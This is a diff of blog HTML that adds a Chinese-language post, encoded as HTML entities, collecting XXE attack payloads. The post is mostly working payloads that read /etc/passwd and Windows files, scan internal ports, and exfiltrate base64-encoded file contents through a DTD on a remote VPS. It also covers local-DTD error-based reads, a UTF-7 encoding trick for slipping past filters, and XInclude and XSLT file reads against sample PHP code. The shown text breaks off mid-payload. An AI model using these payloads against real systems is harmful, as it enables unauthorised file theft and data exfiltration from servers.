@@ -93,7 +93,7 @@
             
             <a class="navbar-item " href="/about">关于</a>
             
-            <a class="navbar-item " href="http://119.3.219.188/">Threeday</a>
+            <a class="navbar-item " href="http://121.36.32.184/">Threeday</a>
             
         </div>
         
@@ -118,6 +118,172 @@
 
     <section class="section">
     <div class="container">
+    
+        <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            <a href="/2020/04/29/xxe_payload/" itemprop="url">一些常见的XXE payload记录</a>
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2020-04-29T06:28:00.000Z" itemprop="datePublished">Apr 29 2020</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            8 minutes lesen (Über 1254 Wörter)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>&#x6700;&#x8FD1;&#x9047;&#x5230;&#x4E00;&#x4E9B;&#x6CA1;&#x6709;&#x89C1;&#x8FC7;&#x7684;xxe&#x5229;&#x7528;&#x65B9;&#x5F0F;&#xFF0C;&#x5C31;&#x548C;&#x4E4B;&#x524D;&#x7684;&#x5185;&#x5BB9;&#x4E00;&#x8D77;&#x6574;&#x7406;&#x4E86;&#x4E00;&#x4E0B;&#x3002;</p>
+<h2 id="&#x5E38;&#x89C1;&#x5229;&#x7528;"><a href="#&#x5E38;&#x89C1;&#x5229;&#x7528;" class="headerlink" title="&#x5E38;&#x89C1;&#x5229;&#x7528;"></a>&#x5E38;&#x89C1;&#x5229;&#x7528;</h2><h3 id="&#x6709;&#x56DE;&#x663E;"><a href="#&#x6709;&#x56DE;&#x663E;" class="headerlink" title="&#x6709;&#x56DE;&#x663E;"></a>&#x6709;&#x56DE;&#x663E;</h3><ul>
+<li>&#x4EFB;&#x610F;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x5728;window&#x4E2D;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x4E0D;&#x9700;&#x8981;&#x4F7F;&#x7528;file&#x534F;&#x8BAE;&#xFF0C;&#x7528;&#x6587;&#x4EF6;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x6216;&#x8005;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x5373;&#x53EF;&#x3002;</p>
+<ul>
+<li>&#x7AEF;&#x53E3;&#x626B;&#x63CF;</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;&lt;http://127.0.0.1:80&gt;&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x8FD9;&#x4E2A;&#x7528;Brup&#x53BB;&#x626B;&#x5176;&#x5B9E;&#x4E0D;&#x592A;&#x5408;&#x9002;&#xFF0C;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;python&#x5B57;&#x5199;&#x811A;&#x672C;&#x3002;&#x56E0;&#x4E3A;&#x6709;&#x4E9B;&#x7AEF;&#x53E3;&#x672A;&#x5F00;&#x542F;&#xFF0C;&#x8BBF;&#x95EE;&#x65F6;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#xFF0C;&#x4F1A;&#x4E00;&#x76F4;&#x5904;&#x4E8E;&#x8BF7;&#x6C42;&#x72B6;&#x6001;&#x3002;</p>
+<h3 id="&#x65E0;&#x56DE;&#x663E;"><a href="#&#x65E0;&#x56DE;&#x663E;" class="headerlink" title="&#x65E0;&#x56DE;&#x663E;"></a>&#x65E0;&#x56DE;&#x663E;</h3><ul>
+<li>&#x62A5;&#x9519;&#x578B;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;</li>
+</ul>
+<p>vps&#x4E0A;&#x7684;eval.dtd</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;&lt;http://aaaaaaa/?%file;&gt;&apos;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+
+<p>&#x53D1;&#x9001;payload</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY  % xxe SYSTEM &quot;&lt;http://45.32.75.237:1234/error.dtd&gt;&quot; &gt;</span><br><span class="line">    %xxe;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x57FA;&#x4E8E;OOB&#x7684;&#x6570;&#x636E;&#x5916;&#x5E26;</li>
+</ul>
+<p>vps&#x4E0A;&#x7684;eval.dtd</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;&lt;http://ceye/?%file;&gt;&apos;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+
+<p>&#x53D1;&#x9001;payload</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY  % xxe SYSTEM &quot;&lt;http://45.32.75.237:1234/eval.dtd&gt;&quot; &gt;</span><br><span class="line">    %xxe;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x8FD9;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;&#x7684;&#x533A;&#x522B;&#x4EC5;&#x5728;&#x4E8E;&#x8FDC;&#x7A0B;&#x4E3B;&#x673A;&#x4E0A;&#x7684;dtd&#x6587;&#x4EF6;&#x4E2D;&#x6307;&#x5B9A;&#x7684;&#x7F51;&#x7AD9;host&#x662F;&#x5426;&#x5B58;&#x5728;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#x5C31;&#x62A5;&#x9519;&#xFF0C;&#x5B58;&#x5728;&#x5C31;&#x5916;&#x5E26;&#x3002;</p>
+<p>&#x4E3A;&#x4EC0;&#x4E48;&#x4E00;&#x5B9A;&#x8981;&#x4F7F;&#x7528;&#x5916;&#x90E8;dtd&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x5728;&#x4E00;&#x4E2A;payload&#x91CC;&#x9762;&#x5C31;&#x5305;&#x542B;&#x5916;&#x5E26;&#x7684;&#x5B9E;&#x4F53;&#x5462;&#xFF1F;&#x539F;&#x56E0;&#x662F;&#x5916;&#x90E8;DTD&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x5728;&#x7B2C;&#x4E8C;&#x4E2A;&#x5B9E;&#x4F53;&#x4E2D;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x5B9E;&#x4F53;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5185;&#x90E8;DTD&#x4E2D;&#x662F;&#x88AB;&#x7981;&#x6B62;&#x7684;&#x3002;(&#x4E5F;&#x5C31;&#x662F;&#x7981;&#x6B62;&#x5728;&#x5185;&#x90E8;Entity&#x4E2D;&#x5F15;&#x7528;&#x53C2;&#x6570;&#x5B9E;&#x4F53;)</p>
+<h2 id="&#x8FDB;&#x9636;&#x5229;&#x7528;"><a href="#&#x8FDB;&#x9636;&#x5229;&#x7528;" class="headerlink" title="&#x8FDB;&#x9636;&#x5229;&#x7528;"></a>&#x8FDB;&#x9636;&#x5229;&#x7528;</h2><h3 id="&#x57FA;&#x4E8E;Local-dtd&#x6587;&#x4EF6;&#x7684;XXE"><a href="#&#x57FA;&#x4E8E;Local-dtd&#x6587;&#x4EF6;&#x7684;XXE" class="headerlink" title="&#x57FA;&#x4E8E;Local-dtd&#x6587;&#x4EF6;&#x7684;XXE"></a>&#x57FA;&#x4E8E;Local-dtd&#x6587;&#x4EF6;&#x7684;XXE</h3><p>&#x5F53;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x5141;&#x8BB8;&#x8BF7;&#x6C42;&#x5916;&#x7F51;&#xFF0C;&#x5E76;&#x4E14;&#x5B58;&#x5728;&#x62A5;&#x9519;&#x65F6;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x3002;&#x8FD4;&#x56DE;&#x7684;&#x7ED3;&#x679C;&#x8DDF;&#x62A5;&#x9519;&#x578B;&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002;</p>
+<ul>
+<li>windows&#xFF0C;&#x8BFB;&#x53D6;&#x672C;&#x5730;&#x6587;&#x4EF6;&#xFF1A;</li>
+</ul>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="hljs-meta">	&lt;!ENTITY % local_dtd SYSTEM &quot;C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">	&lt;!ENTITY % SuperClass &apos;&gt;</span></span><br><span class="line"><span class="hljs-meta">		&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">		&amp;#x25;eval;</span></span><br><span class="line"><span class="hljs-meta">		&amp;#x25;send;</span></span><br><span class="line"><span class="hljs-meta">	&lt;!ENTITY test &quot;test&quot;&apos;&gt;</span></span><br><span class="line"><span class="hljs-meta">	%local_dtd;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>111<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Linux Ubuntu</li>
+</ul>
+<p>&#x7528;dtd-finder&#x63D0;&#x53D6;ubuntu&#x91CC;&#x9762;&#x7684;&#x5B9E;&#x4F53;&#x7136;&#x540E;&#x751F;&#x6210;&#x51FA;&#x7684;payload&#xFF0C;&#x5728;&#x6211;&#x7684;&#x963F;&#x91CC;&#x4E91;ubuntu&#x7684;vps&#x4E0A;&#x4E5F;&#x6709;&#x8FD9;&#x4E2A;dtd&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x4E00;&#x4E2A;&#x8F83;&#x4E3A;&#x901A;&#x7528;&#x7684;dtd&#x6587;&#x4EF6;&#x3002;</p>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="hljs-meta">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/schema/xml-core/catalog.dtd&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta"></span></span><br><span class="line"><span class="hljs-meta">    &lt;!ENTITY % local.uri.attribs &apos;&gt;</span></span><br><span class="line"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">        &amp;#x25;eval;</span></span><br><span class="line"><span class="hljs-meta">        &amp;#x25;error;</span></span><br><span class="line"><span class="hljs-meta">        &lt;!ELEMENT aa &quot;bb&quot;&apos;&gt;</span></span><br><span class="line"><span class="hljs-meta"></span></span><br><span class="line"><span class="hljs-meta">    %local_dtd;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Linux Centos</li>
+</ul>
+<p>&#x6211;&#x53EA;&#x5728;&#x6211;&#x7684;&#x817E;&#x8BAF;&#x4E91;Centos&#x7684;vps&#x4E0A;&#x53D1;&#x73B0;&#x4E86;&#x8FD9;&#x4E2A;dtd&#x6587;&#x4EF6;&#x3002;&#x6CA1;&#x6709;&#x5BF9;&#x5E94;&#x73AF;&#x5883;&#x3001;&#x6682;&#x4E14;&#x5C1D;&#x8BD5;&#x8FD9;&#x4E2A;&#x5427;&#xFF0C;</p>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="hljs-meta">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">    &lt;!ENTITY % expr &apos;aaa)&gt;</span></span><br><span class="line"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">        &amp;#x25;eval;</span></span><br><span class="line"><span class="hljs-meta">        &amp;#x25;error;</span></span><br><span class="line"><span class="hljs-meta">        &lt;!ELEMENT aa (bb&apos;&gt;</span></span><br><span class="line"><span class="hljs-meta">    %local_dtd;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x5BFB;&#x627E;&#x672C;&#x5730;&#x53EF;&#x5229;&#x7528;&#x7684;dtd&#x6587;&#x4EF6;&#xFF1A;</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/6913" target="_blank" rel="noopener">https://xz.aliyun.com/t/6913</a> (&#x624B;&#x52A8;&#x5BFB;&#x627E;&#x53C2;&#x8003;&#x4F8B;&#x5B50;)</li>
+<li><a href="https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html" target="_blank" rel="noopener">https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html</a></li>
+<li><a href="https://github.com/GoSecure/dtd-finder" target="_blank" rel="noopener">https://github.com/GoSecure/dtd-finder</a> (&#x5728;&#x4E0A;&#x9762;&#x7684;&#x5217;&#x8868;&#x4E2D;&#x4E0D;&#x5B58;&#x7684;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x5BFB;&#x627E;)</li>
+</ul>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x5DE5;&#x5177;&#x4F7F;&#x7528;&#xFF1A;</span><br><span class="line">docker export <span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span> -o iamge.tar</span><br><span class="line">java -jar dtd-finder-1.0-all.jar iamge.tar</span><br></pre></td></tr></table></figure>
+
+<h3 id="&#x5BF9;payload&#x8FDB;&#x884C;UTF7&#x7F16;&#x7801;"><a href="#&#x5BF9;payload&#x8FDB;&#x884C;UTF7&#x7F16;&#x7801;" class="headerlink" title="&#x5BF9;payload&#x8FDB;&#x884C;UTF7&#x7F16;&#x7801;"></a>&#x5BF9;payload&#x8FDB;&#x884C;UTF7&#x7F16;&#x7801;</h3><p>&#x7528;&#x4F7F;&#x7528;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B;&#x8FC7;&#x6EE4;</p>
+<p>utf-8 &#x21D2; utf-7 &#xFF1A;<a href="https://www.motobit.com/util/charset-codepage-conversion.asp" target="_blank" rel="noopener">https://www.motobit.com/util/charset-codepage-conversion.asp</a></p>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-7&quot;?&gt;</span> </span><br><span class="line">+ADwAIQ-DOCTYPE foo +AFs-</span><br><span class="line">	+ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI- +AD4-</span><br><span class="line">+AF0APg-</span><br><span class="line">+ADw-root+AD4APA-name+AD4AJg-xxe+ADsAPA-/name+AD4APA-/root+AD4-</span><br></pre></td></tr></table></figure>
+
+<h3 id="xinclude"><a href="#xinclude" class="headerlink" title="xinclude"></a>xinclude</h3><p>&#x5728;&#x4E0D;&#x5141;&#x8BB8;&#x5305;&#x542B;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#xFF0C;&#x4F46;&#x53C8;&#x5B58;&#x5728;$dom-&gt;include();&#x65F6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;xinclude&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x3002;</p>
+<p>&#x540E;&#x53F0;&#x6E90;&#x7801;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">	$xml = file_get_contents(<span class="hljs-string">&apos;php://input&apos;</span>);</span><br><span class="line">	$dom = <span class="hljs-keyword">new</span> DOMDocument;</span><br><span class="line">	$dom-&gt;preserveWhiteSpace = <span class="hljs-keyword">false</span>;</span><br><span class="line">	$dom-&gt;formatOutput = <span class="hljs-keyword">true</span>;</span><br><span class="line">	$dom-&gt;loadXML($xml);</span><br><span class="line">	$dom-&gt;include(); <span class="hljs-comment">// &#x591A;&#x4E86;&#x8FD9;&#x4E00;&#x6761;&#x8BED;&#x53E5;</span></span><br><span class="line">	<span class="hljs-keyword">echo</span> $dom-&gt;saveXML();</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x5229;&#x7528;&#x7684;payload&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">xmlns:xi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line"> <span class="hljs-tag">&lt;<span class="hljs-name">xi:include</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;file:///etc/passwd&quot;</span> <span class="hljs-attr">parse</span>=<span class="hljs-string">&quot;text&quot;</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="XSLT"><a href="#XSLT" class="headerlink" title="XSLT"></a>XSLT</h3><p>XSLT&#xFF1A;&#x89C4;&#x5B9A;&#x4E00;&#x4E2A;XML&#x5982;&#x4F55;&#x8F6C;&#x6362;&#x4E3A;&#x5176;&#x4ED6;&#x6587;&#x6863;&#x3002;</p>
+<p>PHP&#x9ED8;&#x8BA4;&#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x6269;&#x5C55;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5B89;&#x88C5;&#x3002;(phpstudy&#x4E2D;&#x76F4;&#x63A5;&#x5F00;&#x542F;php_xsl&#x6269;&#x5C55;&#x5373;&#x53EF;)</p>
+<p>&#x540E;&#x53F0;&#x6E90;&#x7801;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> </span><br><span class="line">	$xls = file_get_contents(<span class="hljs-string">&apos;php://input&apos;</span>); <span class="hljs-comment">// &#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x4F20;&#x9012;&#x8FDB;&#x6765;&#x7684;&#x662F;xsl</span></span><br><span class="line">	$xslDoc = <span class="hljs-keyword">new</span> DOMDocument();</span><br><span class="line">	$xslDoc-&gt;load($xls);</span><br><span class="line">	$xmlDoc = <span class="hljs-keyword">new</span> DOMDocument();</span><br><span class="line">	$xmlDoc-&gt;load(<span class="hljs-string">&quot;test.xml&quot;</span>);</span><br><span class="line">	$proc = <span class="hljs-keyword">new</span> XSLTProcessor();</span><br><span class="line">	$proc-&gt;importStylesheet($xslDoc);</span><br><span class="line">	<span class="hljs-keyword">echo</span> $proc-&gt;transformToXML($xmlDoc);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x666E;&#x901A;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;.xsl&#xFF1A;(&#x76F4;&#x63A5;&#x4FEE;&#x6539;&#x4E86;root&#x7ED3;&#x70B9;&#x7684;&#x5185;&#x5BB9;)</p>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE ANY [  </span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY shit SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt&quot;&gt;   </span></span><br><span class="line"><span class="hljs-meta">]&gt;</span>  </span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/root&quot;</span>&gt;</span></span><br><span class="line">  &amp;shit;</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x5982;&#x679C;&#x672A;&#x5F00;&#x542F;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x62A5;&#x9519;&#x6216;&#x8005;OOB&#x65B9;&#x5F0F;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x5728;&#x672C;&#x673A;&#x642D;&#x5EFA;&#x7684;&#x73AF;&#x5883;&#x5F53;&#x4E2D;&#xFF0C;&#x65E0;&#x6CD5;&#x5916;&#x5E26;&#x51FA;&#x4FE1;&#x606F;&#xFF0C;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x62A5;&#x9519;&#x8BFB;&#x53D6;&#x51FA;&#x90E8;&#x5206;&#xFF0C;&#x5C31;&#x4E0D;&#x6DF1;&#x7A76;&#x4E86;&#x3002;</p>
+<p>&#x62A5;&#x9519;&#xFF1A;</p>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:include</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt&quot;</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>OOB&#xFF1A;(&#x4E5F;&#x4F1A;&#x901A;&#x8FC7;&#x62A5;&#x9519;&#x67E5;&#x770B;&#x5230;)</p>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name1&quot;</span> 